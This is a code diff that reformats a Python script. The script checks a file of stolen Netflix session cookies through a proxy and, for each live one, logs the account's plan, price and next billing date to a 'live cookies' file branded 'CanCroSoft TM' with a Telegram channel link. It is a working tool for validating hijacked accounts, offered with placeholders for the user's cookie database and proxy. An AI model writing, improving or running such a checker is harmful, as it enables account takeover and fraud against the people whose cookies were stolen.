@@ -6,7 +6,7 @@ from time import sleep
 
 
 def process_line(line, prox):
-    if not (match := re.search(r'NetflixId\s+(.+)', line)):
+    if not (match := re.search(r"NetflixId\s+(.+)", line)):
         return
     netflixTK = match.group(1)
     retry_count = 1
@@ -15,8 +15,8 @@ def process_line(line, prox):
         try:
             entry = prox
             proxies = {
-                'http': entry,
-                'https': entry,
+                "http": entry,
+                "https": entry,
             }
 
             url = "https://www.netflix.com/BillingActivity"
@@ -47,21 +47,53 @@ def process_line(line, prox):
             if div_billing_summary is None:
                 print("Cookie inválido ou expirado!")
             else:
-                tipo_plano = div_billing_summary.find("div", attrs={"data-uia": "plan-name"}).text.strip()
-                valor_plano = div_billing_summary.find("span", attrs={"data-uia": "plan-total-amount"}).text.strip()
-                proxima_data_cobranca = div_billing_summary.find("div", attrs={"data-uia": "streaming-next-cycle"}).text.strip()
-                print('Cookie NETFLIX by CanCroSoft TM\n', line, "\n-> Tipo de plano:", tipo_plano, " | Valor do plano:", valor_plano, " | Próxima data de cobrança:", proxima_data_cobranca, '\nhttps://t.me/cancSoftmTeam\n')
-                with open('cookieslive/NetflixLiveCookies.txt', 'a+', encoding='utf-8') as s:
-                    s.write('Cookie NETFLIX by CanCroSoft TM\n' + line + "\n-> Tipo de plano:" + tipo_plano + " | Valor do plano:" + valor_plano + " | Próxima data de cobrança:" + proxima_data_cobranca + '\nhttps://t.me/cancSoftmTeam\n\n============================\n')
+                tipo_plano = div_billing_summary.find(
+                    "div", attrs={"data-uia": "plan-name"}
+                ).text.strip()
+                valor_plano = div_billing_summary.find(
+                    "span", attrs={"data-uia": "plan-total-amount"}
+                ).text.strip()
+                proxima_data_cobranca = div_billing_summary.find(
+                    "div", attrs={"data-uia": "streaming-next-cycle"}
+                ).text.strip()
+                print(
+                    "Cookie NETFLIX by CanCroSoft TM\n",
+                    line,
+                    "\n-> Tipo de plano:",
+                    tipo_plano,
+                    " | Valor do plano:",
+                    valor_plano,
+                    " | Próxima data de cobrança:",
+                    proxima_data_cobranca,
+                    "\nhttps://t.me/cancSoftmTeam\n",
+                )
+                with open(
+                    "cookieslive/NetflixLiveCookies.txt", "a+", encoding="utf-8"
+                ) as s:
+                    s.write(
+                        "Cookie NETFLIX by CanCroSoft TM\n"
+                        + line
+                        + "\n-> Tipo de plano:"
+                        + tipo_plano
+                        + " | Valor do plano:"
+                        + valor_plano
+                        + " | Próxima data de cobrança:"
+                        + proxima_data_cobranca
+                        + "\nhttps://t.me/cancSoftmTeam\n\n============================\n"
+                    )
         except Exception as e:
-            print('[ ! ] ERRO DE REQUISIÇÃO - RETESTANDO!', f' [{retry_count}/{max_retries}]')
+            print(
+                "[ ! ] ERRO DE REQUISIÇÃO - RETESTANDO!",
+                f" [{retry_count}/{max_retries}]",
+            )
             retry_count += 1
-            sleep(2)  # Wait a bit 
+            sleep(2)  # Wait a bit
 
-with open('db/netflix.txt', 'r') as file: #PUT NAME OF YOUR COOKIE DB HERE
+
+with open("db/netflix.txt", "r") as file:  # PUT NAME OF YOUR COOKIE DB HERE
     lines = file.readlines()
 
-prox = 'YOURPROXY HERE'
+prox = "YOURPROXY HERE"
 
 with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
     executor.map(process_line, lines, [prox] * len(lines))
